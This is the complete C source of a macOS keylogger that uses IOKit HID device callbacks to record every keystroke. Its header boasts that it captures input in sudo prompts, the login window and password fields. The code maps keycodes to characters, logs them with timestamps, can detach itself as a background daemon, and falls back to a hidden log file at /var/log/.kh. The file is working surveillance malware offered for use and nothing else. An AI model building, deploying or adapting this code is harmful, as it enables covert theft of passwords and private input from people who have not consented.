// keylogger.macos.c — system-level HID keyboard tap (M2 / Apple Silicon)
// Captures at hardware level: works in sudo prompts, login window,
// NSSecureTextField, password dialogs — anything that blocks CGEventTap.
// Build: clang -O2 -o keylog keylogger.macos.c -framework IOKit -framework CoreFoundation

#include <IOKit/hid/IOHIDManager.h>
#include <IOKit/hid/IOHIDKeys.h>
#include <CoreFoundation/CoreFoundation.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

static FILE *g_log = NULL;
static volatile int g_run = 1;
static int g_caps = 0;

static const char *K_NORMAL[256] = {
    [0x04]="a",[0x05]="b",[0x06]="c",[0x07]="d",[0x08]="e",[0x09]="f",
    [0x0A]="g",[0x0B]="h",[0x0C]="i",[0x0D]="j",[0x0E]="k",[0x0F]="l",
    [0x10]="m",[0x11]="n",[0x12]="o",[0x13]="p",[0x14]="q",[0x15]="r",
    [0x16]="s",[0x17]="t",[0x18]="u",[0x19]="v",[0x1A]="w",[0x1B]="x",
    [0x1C]="y",[0x1D]="z",
    [0x1E]="1",[0x1F]="2",[0x20]="3",[0x21]="4",[0x22]="5",[0x23]="6",
    [0x24]="7",[0x25]="8",[0x26]="9",[0x27]="0",
    [0x28]="\n",[0x29]="\x1b",[0x2A]="\t",[0x2B]=" ",
    [0x2D]="-",[0x2E]="=",[0x2F]="[",[0x30]="]",[0x31]="\\",[0x33]=";",
    [0x34]="'",[0x35]="`",[0x36]=",",[0x37]=".",[0x38]="/",
    [0x54]="/",[0x55]="*",[0x56]="-",[0x57]="+",[0x58]="\n",[0x59]="1",
    [0x5A]="2",[0x5B]="3",[0x5C]="4",[0x5D]="5",[0x5E]="6",[0x5F]="7",
    [0x60]="8",[0x61]="9",[0x62]="0",[0x63]=".",[0x67]="="
};

static const char *K_SHIFT[256] = {
    [0x04]="A",[0x05]="B",[0x06]="C",[0x07]="D",[0x08]="E",[0x09]="F",
    [0x0A]="G",[0x0B]="H",[0x0C]="I",[0x0D]="J",[0x0E]="K",[0x0F]="L",
    [0x10]="M",[0x11]="N",[0x12]="O",[0x13]="P",[0x14]="Q",[0x15]="R",
    [0x16]="S",[0x17]="T",[0x18]="U",[0x19]="V",[0x1A]="W",[0x1B]="X",
    [0x1C]="Y",[0x1D]="Z",
    [0x1E]="!",[0x1F]="@",[0x20]="#",[0x21]="$",[0x22]="%",[0x23]="^",
    [0x24]="&",[0x25]="*",[0x26]="(",[0x27]=")",
    [0x28]="\n",[0x29]="\x1b",[0x2A]="\t",[0x2B]=" ",[0x2D]="_",[0x2E]="+",
    [0x2F]="{",[0x30]="}",[0x31]="|",[0x33]=":",[0x34]="\"",[0x35]="~",
    [0x36]="<",[0x37]=">",[0x38]="?",[0x54]="/",[0x55]="*",[0x56]="-",
    [0x57]="+",[0x58]="\n",[0x59]="1",[0x5A]="2",[0x5B]="3",[0x5C]="4",
    [0x5D]="5",[0x5E]="6",[0x5F]="7",[0x60]="8",[0x61]="9",[0x62]="0",
    [0x63]=".",[0x67]="="
};

static const char *special_name(uint8_t u) {
    switch (u) {
        case 0x29: return "[ESC]";   case 0x2A: return "[TAB]";
        case 0x28: return "[ENTER]"; case 0x4C: return "[DEL]";
        case 0x49: return "[INS]";    case 0x4A: return "[HOME]";
        case 0x4D: return "[END]";    case 0x4B: return "[PGUP]";
        case 0x4E: return "[PGDN]";   case 0x4F: return "[RIGHT]";
        case 0x50: return "[LEFT]";   case 0x51: return "[DOWN]";
        case 0x52: return "[UP]";     case 0x39: return "[CAPS]";
        case 0x3A: return "[F1]";     case 0x3B: return "[F2]";
        case 0x3C: return "[F3]";     case 0x3D: return "[F4]";
        case 0x3E: return "[F5]";     case 0x3F: return "[F6]";
        case 0x40: return "[F7]";     case 0x41: return "[F8]";
        case 0x42: return "[F9]";     case 0x43: return "[F10]";
        case 0x44: return "[F11]";    case 0x45: return "[F12]";
        case 0xE0: return "[LCtrl]";  case 0xE1: return "[LShift]";
        case 0xE2: return "[LAlt]";    case 0xE3: return "[LCmd]";
        case 0xE4: return "[RCtrl]";  case 0xE5: return "[RShift]";
        case 0xE6: return "[RAlt]";   case 0xE7: return "[RCmd]";
        default:   return NULL;
    }
}

static void log_write(const char *s) {
    if (!g_log) return;
    fputs(s, g_log);
    fflush(g_log);
}

static void handle_report(uint8_t *r, size_t len) {
    if (len < 8) return;
    uint8_t mod = r[0];
    int shift = (mod & 0x22) != 0;
    int ctrl  = (mod & 0x11) != 0;
    int alt   = (mod & 0x44) != 0;
    int cmd   = (mod & 0x88) != 0;

    static uint8_t last[8] = {0};
    char buf[512]; buf[0]=0; size_t bp=0;

    for (int i = 2; i < 8; i++) {
        uint8_t u = r[i];
        if (u == 0) continue;
        int already = 0;
        for (int j = 2; j < 8; j++) if (last[j] == u) { already = 1; break; }
        if (already) continue;

        if (u == 0x39) { g_caps = !g_caps; continue; }

        char prefix[64]; prefix[0]=0;
        if (ctrl) strcat(prefix, "[Ctrl]+");
        if (alt)  strcat(prefix, "[Alt]+");
        if (cmd)  strcat(prefix, "[Cmd]+");
        if (shift) strcat(prefix, "[Shift]+");

        int use_shift = shift ^ g_caps;
        const char *ch = use_shift ? K_SHIFT[u] : K_NORMAL[u];
        const char *nm = special_name(u);

        if (ctrl || alt || cmd) {
            if (nm) snprintf(buf+bp, sizeof(buf)-bp, "%s%s", prefix, nm);
            else if (ch && ch[0]) snprintf(buf+bp, sizeof(buf)-bp, "%s%s", prefix, ch);
            else snprintf(buf+bp, sizeof(buf)-bp, "%s[0x%02X]", prefix, u);
            bp += strlen(buf+bp);
        } else if (nm && u >= 0x29) {
            snprintf(buf+bp, sizeof(buf)-bp, "%s", nm);
            bp += strlen(buf+bp);
        } else if (ch && ch[0]) {
            snprintf(buf+bp, sizeof(buf)-bp, "%s", ch);
            bp += strlen(buf+bp);
        } else {
            snprintf(buf+bp, sizeof(buf)-bp, "[0x%02X]", u);
            bp += strlen(buf+bp);
        }
    }

    if (bp > 0) {
        time_t t = time(NULL);
        struct tm *tm = localtime(&t);
        char ts[64];
        strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", tm);
        char line[768];
        snprintf(line, sizeof(line), "[%s] %s\n", ts, buf);
        log_write(line);
    }
    memcpy(last, r, 8);
}

static void report_callback(void *ctx, IOReturn res, void *sender,
                           IOHIDReportType type, uint32_t reportID,
                           uint8_t *report, CFIndex len) {
    if (res != kIOReturnSuccess) return;
    uint8_t *p = report;
    CFIndex l = len;
    if (reportID != 0) { p++; l--; if (l <= 0) return; }
    handle_report(p, (size_t)l);
}

static void device_matched(void *ctx, IOReturn res, void *sender, IOHIDDeviceRef dev) {
    if (IOHIDDeviceOpen(dev, kIOHIDOptionsTypeNone) != kIOReturnSuccess) return;
    IOHIDDeviceRegisterInputReportCallback(dev, malloc(256), 256, report_callback, ctx);
    IOHIDDeviceScheduleWithRunLoop(dev, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
}

static void device_removed(void *ctx, IOReturn res, void *sender, IOHIDDeviceRef dev) {
    IOHIDDeviceUnscheduleFromRunLoop(dev, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
    IOHIDDeviceClose(dev, kIOHIDOptionsTypeNone);
}

static void on_signal(int s) { g_run = 0; }

static void daemonize(void) {
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    setsid();
    pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    int fd = open("/dev/null", O_RDWR);
    dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
    if (fd > 2) close(fd);
    umask(022);
    chdir("/");
}

int main(int argc, char **argv) {
    char defaultpath[512];
    const char *home = getenv("HOME");
    if (home && home[0]) {
        snprintf(defaultpath, sizeof(defaultpath), "%s/Downloads/keylog.log", home);
    } else {
        snprintf(defaultpath, sizeof(defaultpath), "/var/log/.kh");
    }
    const char *outpath = defaultpath;
    int do_daemon = 0;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-o") && i+1 < argc) { outpath = argv[++i]; }
        else if (!strcmp(argv[i], "-d")) { do_daemon = 1; }
        else if (!strcmp(argv[i], "-h")) {
            fprintf(stderr, "usage: %s [-o logfile] [-d]\n", argv[0]);
            return 0;
        }
    }
    if (do_daemon) daemonize();

    signal(SIGTERM, on_signal);
    signal(SIGINT,  on_signal);
    signal(SIGHUP,  SIG_IGN);

    g_log = fopen(outpath, "a");
    if (!g_log) { perror("fopen log"); return 1; }
    setvbuf(g_log, NULL, _IOLBF, 0);
    chmod(outpath, 0644);  /* readable by the console user without sudo */

    IOHIDManagerRef mgr = IOHIDManagerCreate(kCFAllocatorDefault, kIOHIDOptionsTypeNone);
    if (!mgr) { fprintf(stderr, "IOHIDManagerCreate failed\n"); return 1; }

    CFMutableDictionaryRef match = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int page = kHIDPage_GenericDesktop;
    int usage = kHIDUsage_GD_Keyboard;
    CFNumberRef pn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &page);
    CFNumberRef un = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &usage);
    CFDictionarySetValue(match, CFSTR(kIOHIDDeviceUsagePageKey), pn);
    CFDictionarySetValue(match, CFSTR(kIOHIDDeviceUsageKey), un);
    IOHIDManagerSetDeviceMatching(mgr, match);
    CFRelease(pn); CFRelease(un); CFRelease(match);

    IOHIDManagerRegisterDeviceMatchingCallback(mgr, device_matched, NULL);
    IOHIDManagerRegisterDeviceRemovalCallback(mgr, device_removed, NULL);
    IOHIDManagerScheduleWithRunLoop(mgr, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);

    IOReturn r = IOHIDManagerOpen(mgr, kIOHIDOptionsTypeNone);
    if (r != kIOReturnSuccess) {
        fprintf(stderr, "IOHIDManagerOpen failed: 0x%x (need Input Monitoring permission)\n", r);
        return 1;
    }

    while (g_run) {
        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.5, false);
    }

    IOHIDManagerClose(mgr, kIOHIDOptionsTypeNone);
    IOHIDManagerUnscheduleFromRunLoop(mgr, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
    CFRelease(mgr);
    if (g_log) fclose(g_log);
    return 0;
}